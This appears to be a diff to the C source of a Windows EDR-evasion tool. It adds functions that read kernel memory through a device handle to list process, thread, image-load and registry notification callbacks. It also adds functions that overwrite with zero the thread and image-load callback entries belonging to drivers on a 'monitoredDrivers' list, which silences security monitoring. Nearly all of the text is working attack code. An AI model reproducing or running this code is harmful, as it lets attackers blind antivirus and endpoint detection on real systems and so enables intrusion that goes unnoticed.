@@ -122,13 +122,15 @@ VOID SearchModule(ULONG64 Address, ModulesData* module) {
 }
 
 
+//		CALLBACK LIST FUNCTIONS
+
 VOID ListProcCallback(HANDLE hDevice) {
 	int max_entries = 64;
 	DWORD64 pspCreateProcessNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateProcessNotifyRoutine");
 
 	DWORD64 address = (DWORD64)ntoskrnlBase + pspCreateProcessNotifyRoutineArray;
 
-	printf("pspCreateProcessNotifyRoutineArray address: %llx\n", address);
+	printf("PspCreateProcessNotifyRoutineArray address: %llx\n", address);
 	ModulesData moduleInfo = { 0 };
 	
 	DWORD64 readPspAddr;
@@ -152,6 +154,118 @@ VOID ListProcCallback(HANDLE hDevice) {
 
 
 }
+
+VOID ListThreadCallback(HANDLE hDevice) {
+	int max_entries = 64;
+	DWORD64 PspCreateThreadNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateThreadNotifyRoutine");
+
+	DWORD64 address = (DWORD64)ntoskrnlBase + PspCreateThreadNotifyRoutineArray;
+
+	printf("PspCreateThreadNotifyRoutineArray address: %llx\n", address);
+	ModulesData moduleInfo = { 0 };
+
+	DWORD64 readPspAddr;
+	for (size_t i = 0; i < max_entries; i++) {
+		readPspAddr = Read64(hDevice, address);
+		address += sizeof(ULONG_PTR);
+		if (!readPspAddr) {
+			continue;
+		}
+		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
+		readPspAddr = Read64(hDevice, readPspAddr);
+		SearchModule(readPspAddr, &moduleInfo);
+		if (!moduleInfo.moduleBase) {
+			continue;
+		}
+
+		printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);
+
+	}
+
+
+}
+
+VOID ListLoadImageCallback(HANDLE hDevice) {
+	int max_entries = 64;
+	DWORD64 PspLoadImageNotifyRoutineArray = EzPdbGetRva(&pdb, "PspLoadImageNotifyRoutine");
+
+	DWORD64 address = (DWORD64)ntoskrnlBase + PspLoadImageNotifyRoutineArray;
+
+	printf("PspLoadImageNotifyRoutineArray address: %llx\n", address);
+	ModulesData moduleInfo = { 0 };
+
+	DWORD64 readPspAddr;
+	for (size_t i = 0; i < max_entries; i++) {
+		readPspAddr = Read64(hDevice, address);
+		address += sizeof(ULONG_PTR);
+		if (!readPspAddr) {
+			continue;
+		}
+		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
+		readPspAddr = Read64(hDevice, readPspAddr);
+		SearchModule(readPspAddr, &moduleInfo);
+		if (!moduleInfo.moduleBase) {
+			continue;
+		}
+
+		printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);
+
+	}
+
+}
+
+VOID ListRegCallback(HANDLE hDevice) {
+	int max_entries = 64;
+	DWORD64 CallbackListHead = EzPdbGetRva(&pdb, "CallbackListHead");
+
+	DWORD64 listHead = (DWORD64)ntoskrnlBase + CallbackListHead;
+
+	printf("CallBackListHead at address: %llx\n", listHead);
+	printf("Press any key to continue\n");
+	getchar();
+	ModulesData moduleInfo = { 0 };
+	DWORD64 moduleFuncAddr;
+
+	DWORD64 currListEntry = listHead;
+	BYTE* entry = (BYTE*)malloc(sizeof(REGISTRY_CALLBACK_ITEM));
+	REGISTRY_CALLBACK_ITEM* castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;
+
+	int i = 0;
+	for (size_t i = 0; i < max_entries; i ++){
+		// moduleFuncAddr = Read64(hDevice, curr)
+		ReadN(hDevice, currListEntry, sizeof(REGISTRY_CALLBACK_ITEM), entry);
+		castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;
+
+		currListEntry = (DWORD64)castedEntry->Item.Flink;
+
+		
+		//printf("currListEntry: flink  0x%llx\n", castedEntry->Item.Flink);
+		//printf("currListEntry: blink  0x%llx\n", castedEntry->Item.Blink);
+		//printf("currListEntry: Context  0x%llx\n", castedEntry->Context);
+		//printf("currListEntry: Function  0x%llx\n", castedEntry->Function);
+		if ((DWORD64)castedEntry->Item.Flink == listHead) {
+			break;
+		}
+		if (castedEntry->Function) {
+			moduleFuncAddr = castedEntry->Function;
+		}
+		else if (castedEntry->Context) {
+			moduleFuncAddr = castedEntry->Context;
+		}
+		printf("Searching callback for addr: %llx\n", moduleFuncAddr);
+		SearchModule(moduleFuncAddr, &moduleInfo);
+
+		if (moduleInfo.moduleBase) {
+			printf("Found reg callback by: %s\n", moduleInfo.moduleName);
+		}
+		castedEntry = (REGISTRY_CALLBACK_ITEM*)castedEntry->Item.Flink;
+	}
+	free(entry);
+
+
+}
+
+//		CALLBACK DELETING FUNCTIONS
 
 VOID DeleteProcCallback(HANDLE hDevice) {
 	int max_entries = 64;
@@ -198,4 +312,97 @@ VOID DeleteProcCallback(HANDLE hDevice) {
 
 	}
 
+}
+
+VOID DeleteThreadCallback(HANDLE hDevice) {
+	int max_entries = 64;
+	DWORD64 PspCreateThreadNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateThreadNotifyRoutine");
+
+	PspCreateThreadNotifyRoutineArray = (DWORD64)ntoskrnlBase + PspCreateThreadNotifyRoutineArray;
+
+	DWORD64 address = PspCreateThreadNotifyRoutineArray;
+
+	printf("PspCreateThreadNotifyRoutineArray address: %llx\n", address);
+	ModulesData moduleInfo = { 0 };
+
+	DWORD64 readPspAddr;
+	for (size_t i = 0; i < max_entries; i++) {
+		readPspAddr = Read64(hDevice, address);
+		address += sizeof(ULONG_PTR);
+		if (!readPspAddr) {
+			continue;
+		}
+		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
+		readPspAddr = Read64(hDevice, readPspAddr);
+		SearchModule(readPspAddr, &moduleInfo);
+		//printf("process callback array[%d] : %llx\n", i, readPspAddr);
+		if (!moduleInfo.moduleBase) {
+			continue;
+		}
+
+		for (size_t j = 0; j < 104; j++) {
+			if (_strcmpi((const char*)moduleInfo.moduleName, monitoredDrivers[j]) == 0) {
+				printf("Deleting thread creation callback for: %s\n", moduleInfo.moduleName);
+				DWORD64 callBackEntry = PspCreateThreadNotifyRoutineArray + i * 8;
+
+				printf("callbackEntry address: %llx\n", callBackEntry);
+				printf("To confirm press Any key\n");
+				getchar();
+
+				Write64(hDevice, callBackEntry, (DWORD64)0x0);
+
+
+			}
+		}
+
+		//printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);
+
+	}
+
+}
+
+VOID DeleteLoadImageCallback(HANDLE hDevice) {
+	int max_entries = 64;
+	DWORD64 PspLoadImageNotifyRoutineArray = EzPdbGetRva(&pdb, "PspLoadImageNotifyRoutine");
+
+	PspLoadImageNotifyRoutineArray = (DWORD64)ntoskrnlBase + PspLoadImageNotifyRoutineArray;
+
+	DWORD64 address = PspLoadImageNotifyRoutineArray;
+
+	printf("PspLoadImageNotifyRoutineArray address: %llx\n", address);
+	ModulesData moduleInfo = { 0 };
+
+	DWORD64 readPspAddr;
+	for (size_t i = 0; i < max_entries; i++) {
+		readPspAddr = Read64(hDevice, address);
+		address += sizeof(ULONG_PTR);
+		if (!readPspAddr) {
+			continue;
+		}
+		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
+		readPspAddr = Read64(hDevice, readPspAddr);
+		SearchModule(readPspAddr, &moduleInfo);
+		//printf("process callback array[%d] : %llx\n", i, readPspAddr);
+		if (!moduleInfo.moduleBase) {
+			continue;
+		}
+
+		for (size_t j = 0; j < 104; j++) {
+			if (_strcmpi((const char*)moduleInfo.moduleName, monitoredDrivers[j]) == 0) {
+				printf("Deleting image loading creation callback for: %s\n", moduleInfo.moduleName);
+				DWORD64 callBackEntry = PspLoadImageNotifyRoutineArray + i * 8;
+
+				printf("callbackEntry address: %llx\n", callBackEntry);
+				printf("To confirm press Any key\n");
+				getchar();
+
+				Write64(hDevice, callBackEntry, (DWORD64)0x0);
+
+
+			}
+		}
+
+		//printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);
+
+	}
 }
